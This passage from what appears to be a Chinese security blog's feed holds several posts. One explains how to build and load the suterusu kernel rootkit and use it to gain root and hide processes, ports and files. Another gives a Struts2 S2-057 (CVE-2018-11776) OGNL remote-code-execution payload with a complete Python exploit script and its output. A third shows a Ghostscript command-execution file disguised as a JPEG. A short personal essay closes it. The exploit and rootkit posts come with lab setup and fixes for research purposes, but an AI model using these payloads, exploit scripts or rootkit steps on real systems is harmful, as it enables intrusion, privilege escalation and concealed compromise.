ROOKIT；内核级有效劫持系统调用输出的 ROOKIT，包括利用 LKM 动态修改内核、替换 SYS_CALL 实现劫持、工作在 VFS 利用 Hook 文件系统的 file_open 操作；芯片级即集成到 Intel 或 AMD 芯片中的 ROOKIT。</p></blockquote><img src="/2018/10/04/about-the-backdoor/rootkit_arch_show.png"><p>下面将展示如何编译和使用 suterusu ROOKIT <a href="https://github.com/mncoppola/suterusu" title="[下载地址]" target="_blank" rel="noopener">下载地址</a> 。</p><pre><code>[root@Centos7 suterusu]# yum install kernel-develFailed to set locale, defaulting to CLoaded plugins: fastestmirrorLoading mirror speeds from cached hostfile * base: mirrors.163.com * epel: fedora.cs.nctu.edu.tw * extras: mirrors.163.com * updates: mirrors.cn99.comPackage kernel-devel-3.10.0-862.14.4.el7.x86_64 already installed and latest versionNothing to do[root@Centos7 suterusu]# ls /usr/src/kernels/3.10.0-862.14.4.el7.x86_64/Kconfig   Makefile.qlock  System.map  block   drivers   fs       init  kernel  mm   samples  security  tools  virtMakefile  Module.symvers  arch        crypto  firmware  include  ipc   lib     net  scripts  sound     usr    vmlinux.id[root@Centos7 suterusu]#</code></pre><p>编译内核模块</p><pre><code>[root@Centos7 suterusu]# make linux-x86 KDIR=/usr/src/kernels/3.10.0-862.14.4.el7.x86_64/make ARCH=x86 EXTRA_CFLAGS=&quot;-D_CONFIG_X86_ &quot; -C /usr/src/kernels/3.10.0-862.14.4.el7.x86_64/ M=/tmp/suterusu modulesmake[1]: Entering directory `/usr/src/kernels/3.10.0-862.14.4.el7.x86_64&#39;  CC [M]  /tmp/suterusu/main.o  CC [M]  /tmp/suterusu/util.o  CC [M]  /tmp/suterusu/module.o  LD [M]  /tmp/suterusu/suterusu.o  Building modules, stage 2.  MODPOST 1 modules  CC      /tmp/suterusu/suterusu.mod.o  LD [M]  /tmp/suterusu/suterusu.komake[1]: Leaving directory `/usr/src/kernels/3.10.0-862.14.4.el7.x86_64&#39;[root@Centos7 suterusu]# ls |grep suterusu.kosuterusu.ko[root@Centos7 suterusu]#</code></pre><p>安装内核模块</p><pre><code>insmod suterusu.ko</code></pre><p>编译用户态应用</p><pre><code>[root@Centos7 suterusu]# gcc sock.c -o socksock.c: In function &#39;main&#39;:sock.c:205:40: warning: incompatible implicit declaration of built-in function &#39;strlen&#39; [enabled by default]                 rk_file_args.namelen = strlen(name);                                        ^sock.c:220:40: warning: incompatible implicit declaration of built-in function &#39;strlen&#39; [enabled by default]                 rk_file_args.namelen = strlen(name);                                        ^[root@Centos7 suterusu]# ls |grep socksock</code></pre><p>用户态命令参数</p><pre><code>./sock 0 获取 ROOT 权限./sock 1 [PID] 隐藏指定 PID 应用./sock 2 [PID] 显示指定 PID 应用./sock 3 [PORT] 隐藏指定 PORT./sock 4 [PORT] 显示指定 PORT./sock 11 [name] 隐藏指定文件名或文件夹./sock 12 [name] 显示指定文件名或文件夹…… 更多命令参数请参考官方项目文档</code></pre><p>如下所示，进行隐藏端口、隐藏进程演示</p><img src="/2018/10/04/about-the-backdoor/rootkit_show.png">]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;&lt;p&gt;后门是一种绕过认证或系统加密的方法，开发人员会出于某原因，可能为自己的程序构建后门程序。例如，为了提供简单的维护，开发人员引入了一个后门，可以恢复设备厂商的默认密码；同时攻击者也会将后门种植到有漏洞的服务器来接管服务器，执行攻击和上传恶意payloa
      
    
    </summary>
    
      <category term="安全应急" scheme="https://l0gs.xf0rk.space/categories/%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5/"/>
    
    
      <category term="安全应急" scheme="https://l0gs.xf0rk.space/tags/%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5/"/>
    
      <category term="后门入侵" scheme="https://l0gs.xf0rk.space/tags/%E5%90%8E%E9%97%A8%E5%85%A5%E4%BE%B5/"/>
    
  </entry>
  
  <entry>
    <title>Apache Struts2 S2-057 远程代码执行</title>
    <link href="https://l0gs.xf0rk.space/2018/08/25/apache-struts2-cve-2018-11776/"/>
    <id>https://l0gs.xf0rk.space/2018/08/25/apache-struts2-cve-2018-11776/</id>
    <published>2018-08-25T06:59:59.000Z</published>
    <updated>2019-01-21T15:21:43.518Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>2018年8月23日，Apache Strust2发布最新安全公告，Apache Struts2 存在远程代码执行的高危漏洞，漏洞编号为 CVE-2018-11776（S2-057）。Struts2 在 XML 配置中如果 namespace 值未设置且（Action Configuration）中未设置或用通配符 namespace 时可能会导致远程代码执行。</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>漏洞远程代码执行场景为 S2-057，涉及到的组件有 Tomcat + Struts2，Struts2 使用官网的 showcase 项目，为节约环境搭建的时间，测试使用了前辈已经做好的 Struts2 showcase 的 Docker 镜像，拉取漏洞镜像并启动容器</p><pre><code>docker pull piesecurity/apache-struts2-cve-2017-5638docker run --rm -ti --name struts2 -p 8081:8081 piesecurity/apache-struts2-cve-2017-5638 /bin/bash</code></pre><p>镜像为默认 Tomcat + Struts showcase 项目配置，默认配置该漏洞无法利用成功（ 尴尬的 RCE ），修改配置以便漏洞利用成功，在 /usr/local/tomcat/webapps/ROOT/WEB-INF/classes/struts.xml 文件中添加如下配置</p><pre><code>&lt;constant name=&quot;struts.mapper.alwaysSelectFullNamespace&quot; value=&quot;true&quot; /&gt;&lt;action name=&quot;help&quot;&gt;    &lt;result type=&quot;redirectAction&quot;&gt;        &lt;param name=&quot;actionName&quot;&gt;date.action&lt;/param&gt;    &lt;/result&gt;&lt;/action&gt;</code></pre><p>测试下环境是否搭建成功（手工设置 Tomcat 应用端口为 8081，请根据 Tomcat 手机配置调整下述请求相关端口）</p><pre><code>$curl localhost:8081/help.action -v*   Trying ::1...* TCP_NODELAY set* Connected to localhost (::1) port 8081 (#0)&gt; GET /help.action HTTP/1.1&gt; Host: localhost:8081&gt; User-Agent: curl/7.54.0&gt; Accept: */*&gt;&lt; HTTP/1.1 302 Found&lt; Server: Apache-Coyote/1.1&lt; Location: /date.action&lt; Content-Length: 0&lt; Date: Sat, 25 Aug 2018 07:27:41 GMT&lt;* Connection #0 to host localhost left intact</code></pre><h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><p>namespace 是 struts action 组合，即使两个名称相同的 action，如果 namespace 不同，那么其 action 就完全不同，例如</p><table><thead><tr><th style="text-align:center">/help.action</th><th style="text-align:center">/xnamespace/help.action</th></tr></thead><tbody><tr><td style="text-align:center">help.action 的 namespace 是 <code>/</code></td><td style="text-align:center">help.action 的 namespace 是 <code>/xnamespace</code></td></tr></tbody></table><p>当使用未指定任何 namespace 的 action 将会使用 <code>/*</code> 进行匹配。如果一个 action 未找到对应的 namespace，struts 其会将<strong><em> 用户输入的 namespace 字段 </em></strong>当成 OGNL 表达式来执行，进而导致了 RCE 命令执行漏洞。</p><blockquote><p>换句话就是说，在符合一定场景下，struts 可以把用户输入的 namespace 字段当成 OGNL 表达式执行，为实现漏洞利用过程，需要将 namespace 进行 URL 编码，然后拼接在 URL 中。</p></blockquote><h3 id="数值计算-RCE"><a href="#数值计算-RCE" class="headerlink" title="数值计算 RCE"></a>数值计算 RCE</h3><p>以下为测试数值计算 Payload，执行的操作为 <code>2+2</code></p><pre><code>${2+2} </code></pre><p>如下为测试请求响应, <code>Location: /4/date.action</code> 中的 <code>4</code> 为执行 Payload 结果</p><pre><code>HTTP/1.1 302 FoundServer: Apache-Coyote/1.1Location: /4/date.actionContent-Length: 0Date: Sat, 25 Aug 2018 07:36:56 GMTConnection: close</code></pre><h3 id="回显-RCE"><a href="#回显-RCE" class="headerlink" title="回显 RCE"></a>回显 RCE</h3><p>S2-057 既然是 RCE ，那就得把 RCE 给复现出来，以下为带回显的 Payload，执行的命令为 <code>id</code></p><pre><code>${(#_memberAccess[&#39;allowStaticMethodAccess&#39;]=true).(#cmd=&#39;id&#39;).(#iswin=(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds=(#iswin?{&#39;cmd.exe&#39;,&#39;c&#39;,#cmd}:{&#39;bash&#39;,&#39;-c&#39;,#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}</code></pre><p>如下为测试请求响应</p><pre><code>HTTP/1.1 200 OKServer: Apache-Coyote/1.1Date: Sat, 25 Aug 2018 06:58:03 GMTConnection: closeContent-Length: 39uid=0(root) gid=0(root) groups=0(root)</code></pre><h3 id="自动化工具"><a href="#自动化工具" class="headerlink" title="自动化工具"></a>自动化工具</h3><p>如下为远程执行命令并回显的 Python 利用代码<br><pre><code>import sysimport urllibimport urllib2import httplibdef exploit(host,cmd):    print &quot;[Execute]: {}&quot;.format(cmd)    ognl_payload = &quot;${&quot;    ognl_payload += &quot;(#_memberAccess[&#39;allowStaticMethodAccess&#39;]=true).&quot;    ognl_payload += &quot;(#cmd=&#39;{}&#39;).&quot;.format(cmd)    ognl_payload += &quot;(#iswin=(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).&quot;    ognl_payload += &quot;(#cmds=(#iswin?{&#39;cmd.exe&#39;,&#39;&#x2F;c&#39;,#cmd}:{&#39;bash&#39;,&#39;-c&#39;,#cmd})).&quot;    ognl_payload += &quot;(#p=new java.lang.ProcessBuilder(#cmds)).&quot;    ognl_payload += &quot;(#p.redirectErrorStream(true)).&quot;    ognl_payload += &quot;(#process=#p.start()).&quot;    ognl_payload += &quot;(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).&quot;    ognl_payload += &quot;(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).&quot;    ognl_payload += &quot;(#ros.flush())&quot;    ognl_payload += &quot;}&quot;    if not &quot;:&quot; in host:        host = &quot;{}:8080&quot;.format(host)    # encode the payload    ognl_payload_encoded = urllib.quote_plus(ognl_payload)    # further encoding    url = &quot;http:&#x2F;&#x2F;{}&#x2F;{}&#x2F;help.action&quot;.format(host, ognl_payload_encoded.replace(&quot;+&quot;,&quot;%20&quot;).replace(&quot; &quot;, &quot;%20&quot;).replace(&quot;%2F&quot;,&quot;&#x2F;&quot;))    print &quot;[Url]: {}\n\n\n&quot;.format(url)    try:        request = urllib2.Request(url)        response = urllib2.urlopen(request).read()    except httplib.IncompleteRead, e:        response = e.partial    print responseif len(sys.argv) &lt; 3:    sys.exit(&#39;Usage: %s &lt;host:port&gt; &lt;cmd&gt;&#39; % sys.argv[0])else:    exploit(sys.argv[1],sys.argv[2])</code></pre></p><p>自动化测试结果</p><pre><code>python exploit.py localhost:8081 whoami[Execute]: whoami[Url]: http://localhost:8081/%24%7B%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29.%28%23cmd%3D%27whoami%27%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27/c%27%2C%23cmd%7D%3A%7B%27bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getOutputStream%28%29%29%29.%28%40org.apache.commons.io.IOUtils%40copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D/help.actionroot</code></pre><h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>默认配置不存在的 RCE，影响就不是“血洗”互联网了，官方建议直接升级Struts到2.3.35版本或2.5.17版本，不存在兼容性问题（需确认更新版本与业务版本之间的差距，建议研发灰度测试、升级）</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol><li>Apache Struts2 CVE-2018-11776 POC <a href="https://www.secjuice.com/apache-struts2-cve-2018-11776/" title="[漏洞分析及POC]" target="_blank" rel="noopener">链接</a></li><li>Apache Struts2 S2-057漏洞分析预警 <a href="https://www.anquanke.com/post/id/157518" title="[漏洞预警]" target="_blank" rel="noopener">链接</a></li><li>CVE-2018-11776-Python-PoC <a href="https://github.com/hook-s3c/CVE-2018-11776-Python-PoC" title="[利用工具]" target="_blank" rel="noopener">链接</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;&lt;p&gt;2018年8月23日，Apache Strust2发布最新安全公告，Apache Struts2 存在远程代码执行的高危漏洞，漏洞编号为 CVE-2018-11776（S2-057）。Struts2 在 XML 配置中如果 namespace 值未设
      
    
    </summary>
    
      <category term="漏洞分析" scheme="https://l0gs.xf0rk.space/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://l0gs.xf0rk.space/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Ghostscript 任意代码执行</title>
    <link href="https://l0gs.xf0rk.space/2018/08/23/ghostscript-shell-exec/"/>
    <id>https://l0gs.xf0rk.space/2018/08/23/ghostscript-shell-exec/</id>
    <published>2018-08-23T12:50:04.000Z</published>
    <updated>2019-01-21T15:21:48.929Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Ghostscript 存在多个安全漏洞可执行任意代码（无 CVE，也没有官方安全补丁），Ghostscript 是 Adobe PostScript 和 PDF 的解释语言，在 ImageMagick、GIMP 等软件程序中广泛应用。</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>大部分文章都没讲环境怎么搭建，就记录下我搭建环境的过程，测试环境是基于 Ghostscript + ImageMagick 来实现的，即需要安装 Ghostscript、ImageMagick，如下为测试系统为 Centos 7.5.1804</p><pre><code>[root@Centos7 ~]# cat /etc/redhat-releaseCentOS Linux release 7.5.1804 (Core)</code></pre><h3 id="安装-Ghostscript-应用"><a href="#安装-Ghostscript-应用" class="headerlink" title="安装 Ghostscript 应用"></a>安装 Ghostscript 应用</h3><p>从 Ghostscript 官网下载源码 <a href="https://www.ghostscript.com/download/gsdnld.html" title="[官网下载]]" target="_blank" rel="noopener">链接</a>，编译安装</p><pre><code>解压源码wget https://github.com/ArtifexSoftware/ghostpdl-downloads/releases/download/gs923/ghostscript-9.23.tar.gztar -xzvf ghostscript-9.23.tar.gz编译安装cd ghostscript-9.23/./configuremakemake install</code></pre><p>检查 Ghostscript 是否安装成功</p><pre><code>[root@Centos7 ~]# gsGPL Ghostscript 9.23 (2018-03-21)Copyright (C) 2018 Artifex Software, Inc.  All rights reserved.This software comes with NO WARRANTY: see the file PUBLIC for details.GS&gt;</code></pre><h3 id="安装-ImageMagick-应用"><a href="#安装-ImageMagick-应用" class="headerlink" title="安装 ImageMagick 应用"></a>安装 ImageMagick 应用</h3><p>从 ImageMagick 官网下载 RPM 包进行安装 <a href="https://www.imagemagick.org/script/download.php" title="[官网下载]]" target="_blank" rel="noopener">链接</a>，需要下载 ImageMagick-libs 和 ImageMagick 两个包，安装过程会提示缺少几个依赖包，使用 yum search 搜索或直接 google 离线下载依赖并安装</p><pre><code>安装 ImageMagick libswget https://www.imagemagick.org/download/linux/CentOS/x86_64/ImageMagick-libs-7.0.8-10.x86_64.rpmrpm -i ImageMagick-libs-7.0.8-10.x86_64.rpm安装 ImageMagickwget https://www.imagemagick.org/download/linux/CentOS/x86_64/ImageMagick-7.0.8-10.x86_64.rpmrpm -i ImageMagick-7.0.8-10.x86_64.rpm</code></pre><p>检查 ImageMagick convert 是否安装成功</p><pre><code>[root@Centos7 tmp]# convert -versionVersion: ImageMagick 7.0.8-10 Q16 x86_64 2018-08-13 https://www.imagemagick.orgCopyright: © 1999-2018 ImageMagick Studio LLCLicense: https://www.imagemagick.org/script/license.phpFeatures: Cipher DPC HDRI Modules OpenMPDelegates (built-in): bzlib cairo djvu fftw fontconfig fpx freetype gslib jbig jng jp2 jpeg lcms ltdl lzma openexr pangocairo png ps rsvg tiff webp wmf x xml zlib</code></pre><p>第一次直接通过 YUM 安装 ImageMagick，convert 就一直没成功，后来换成官网下载 RPM 安装才成功了。</p><h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><p>/invalidaccess 在恢复失败后检查停止，可控制错误处理模块，执行任意命令代码，如下</p><pre><code>[root@Centos7 tmp]# gs -q -sDEVICE=ppmraw -dSAFER -sOutputFile=/dev/null*GS&gt;legalGS&gt;{ null restore } stopped { pop } ifGS&gt;legalGS&gt;mark /OutputFile (%pipe%id) currentdevice putdevicepropsGS&lt;1&gt;showpageuid=0(root) gid=0(root) 组=0(root) 环境=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023[root@Centos7 tmp]#</code></pre><p>可构造恶意文件 exploit.jpeg</p><pre><code>[root@Centos7 tmp]# cat exploit.jpeg%!PSuserdict /setpagedevice undeflegal{ null restore } stopped { pop } iflegalmark /OutputFile (%pipe%id) currentdevice putdeviceprops[root@Centos7 tmp]#</code></pre><p>Centos 系统测试如下，依赖于 ImageMagick 应用的 convert 命令</p><pre><code>[root@Centos7 tmp]# convert exploit.jpeg test.gifuid=0(root) gid=0(root) 组=0(root) 环境=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023[root@Centos7 tmp]#</code></pre><h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>临时修复方案是在ImageMagick policy.xml中禁用PostScript、EPS、PDF以及XPS解码器（我的 policy.xml 文件在 /etc/ImageMagick-7/policy.xml ) 。</p><pre><code>&lt;policymap&gt;  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;PS&quot; /&gt;  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;EPS&quot; /&gt;  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;PDF&quot; /&gt;  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;XPS&quot; /&gt;&lt;/policymap&gt;</code></pre><p>如下所示，修改 ImageMagick 策略后，convert 转换图片时命令利用失败</p><pre><code>[root@Centos7 tmp]# convert exploit.jpeg test.gifconvert: not authorized `exploit.jpeg&#39; @ error/constitute.c/ReadImage/470.convert: no images defined `test.gif&#39; @ error/convert.c/ConvertImageCommand/3288.[root@Centos7 tmp]#</code></pre><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol><li>Should we disable PS coders in policy.xml by default? <a href="http://seclists.org/oss-sec/2018/q3/142" title="[seclist]]" target="_blank" rel="noopener">链接</a></li><li>Ghostscript存在多个漏洞 可导致远程代码执行 <a href="https://www.anquanke.com/post/id/157380" title="[安全客预警]" target="_blank" rel="noopener">链接</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;&lt;p&gt;Ghostscript 存在多个安全漏洞可执行任意代码（无 CVE，也没有官方安全补丁），Ghostscript 是 Adobe PostScript 和 PDF 的解释语言，在 ImageMagick、GIMP 等软件程序中广泛应用。&lt;/p&gt;
&lt;/
      
    
    </summary>
    
      <category term="漏洞分析" scheme="https://l0gs.xf0rk.space/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://l0gs.xf0rk.space/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>谈谈博客</title>
    <link href="https://l0gs.xf0rk.space/2018/07/20/why-to-write/"/>
    <id>https://l0gs.xf0rk.space/2018/07/20/why-to-write/</id>
    <published>2018-07-20T12:46:25.000Z</published>
    <updated>2019-01-21T15:21:53.130Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>明明是你浮躁了整个社会，还埋怨社会浮躁了你！</p></blockquote><p>不知不觉大学毕业已经两年有余，两年来经历了太多，特别是“任性”跳槽之后，从十几个人变成一个人，观念和工作方式的转变，但幸好又找了一个小伙伴，至少在公司不会落单 :-)。</p><p>在上一家公司有个每周例会分享，每轮分享由两个人负责，大概分配到个人就是每个月一次，当时还会偶尔把自己的一些分享整理成文章发布在自己的博客，然后在开发者头条上置顶几次，加上转载的几篇文章置顶，凑了一波 IO 币换了一本书《测之重器，自动化测试框架搭建指南》，虽然书的内容不是非常优秀，但这书应该是自己博客写作的最高境界了。</p><img src="/2018/07/20/why-to-write/hand.jpg"><p>来新公司以后，博客沉寂很久没更新，一懒成虫（主要是没空做更新），后来不知道是出于什么原因，可能一不小心浮躁了，去年也把自己博客给下线了，现在想想确实不应该，至少这段时间不会花大把事件再重复搭一遍，毕竟年纪大了，时间越来越宝贵了 →_→，但博客毕竟换了个新瓶，总有新酒。<br>在近一年里自己在规划建设了很多甲方安全项目，包括外部漏洞扫描、日志平台建设、主机 HIDS 等，想把自己甲方建设相关爬坑经验通过博客分享给互联网，毕竟自己也是从互联网“索取”的，内容没有规划，但应该能包含一些甲方安全建设的实际内容，博客分享时间也不做规划，应该是个长久的过程，也不希望自己被时间绑架了。<br>总而言之，言而总之，希望通过些许文字来记录下爬坑经验！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;&lt;p&gt;明明是你浮躁了整个社会，还埋怨社会浮躁了你！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;不知不觉大学毕业已经两年有余，两年来经历了太多，特别是“任性”跳槽之后，从十几个人变成一个人，观念和工作方式的转变，但幸好又找了一个小伙伴，至少在公司不会落单 :
      
    
    </summary>
    
      <category term="随笔杂谈" scheme="https://l0gs.xf0rk.space/categories/%E9%9A%8F%E7%AC%94%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="随笔杂谈" scheme="https://l0gs.xf0rk.space/tags/%E9%9A%8F%E7%AC%94%E6%9D%82%E8%B0%88/"/>
    
  </entry>
  
</feed>
